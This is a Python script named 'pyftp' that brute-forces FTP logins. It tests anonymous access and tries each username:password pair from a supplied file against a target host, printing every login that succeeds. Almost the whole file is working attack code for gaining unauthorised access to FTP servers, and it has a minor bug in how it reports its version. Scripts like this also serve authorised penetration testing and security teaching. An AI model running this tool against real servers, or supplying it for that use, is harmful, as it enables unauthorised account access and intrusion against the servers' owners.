#!/usr/bin/env python3
# -*- coding: utf-8 -*-
progVersion = "0.2.3"

import ftplib
from sys import version
import optparse

from colorama import Fore, Back, Style
import colorama
colorama.init(autoreset=True)
INFO = Fore.YELLOW
SUCCESS = Fore.GREEN
FAIL = Fore.RED
SETTING = Fore.LIGHTCYAN_EX
RESET = Fore.RESET
EXTRA = Fore.LIGHTGREEN_EX

def bruteLogin(hostname, passwdFile):
  pF = open(passwdFile, 'r')
  for line in pF.readlines():
    line = line.split(':')
    username = line[0]  
    passwd = line[1].strip('\r').strip('\n')
    print(f"{INFO}[INFO] {RESET}Attempting {SUCCESS}'{username}/{passwd}'")
    try:
      ftp = ftplib.FTP(hostname)
      ftp.login(username, passwd)
      print(f"{SUCCESS}[*] {SETTING}{str(hostname)} {RESET}FTP Logon Succeded: {SUCCESS}'{username}/{passwd}'")
    except:
      print(f"{FAIL}[-] {RESET}login with provided FTP credentials.")
  return(None, None)

def anonLogin(hostname):
  print(f"{INFO}[INFO] {RESET}Attempting To Logon As Anonymous.")
  try:
    ftp = ftplib.FTP(hostname)
    ftp.login('anonymous', 'me@your.com')
    print(f"{SUCCESS}[*] {SETTING}{str(hostname)} {RESET}FTP Anonymous Logon Succeeded.")
    ftp.quit()
    return True
  except:
    print(f"{FAIL}[-] {SETTING}{str(hostname)} {RESET}FTP Anonymous Logon Failed.")
    return False

def main(version, progName):
  # Initialize parser
  parser = optparse.OptionParser(f'{progName} -H {SETTING}<target host> {RESET}-p {SETTING}<target port>{RESET}')

  parser.set_description("")


  # Add command line arguments
  parser.add_option('-H', '--host', dest='host', type='string', help=f'specify target host.', metavar=f'{SETTING}HOST{RESET}')
  parser.add_option('-u', '--user', dest='user', type='string', help=f'specify target user.', metavar=f'{SETTING}USER{RESET}')
  parser.add_option('-p', '--passFile', dest='passFile', type='string', help=f'specify a password file to use.', metavar=f'{SETTING}PWFILE{RESET}')
  parser.add_option('-b', '--brute', action='store_true', dest='brute', default=False, help='Brute force an FTP server with provided credentials.')
  parser.add_option('-v', '--version', action='store_true', dest='version', default=False, help='show PyScanner\'s version.')

  # Parse arguments
  (options, args) = parser.parse_args()

  # Targets
  host  = options.host
  user = options.user
  passFile = options.passFile
  brute = options.brute

  if (options.version):
    print(f"{SETTING}{progName.title()} Version {EXTRA}~ {Fore.LIGHTRED_EX}{Style.BRIGHT}V{version}^")
    return 0
  elif host == None:
    parser.print_help()
    exit(1)

  if brute and passFile: bruteLogin(host, passFile)
  if user == "anonymous": anonLogin(host)
  return 0

if __name__ == "__main__":
  main(version, "pyftp")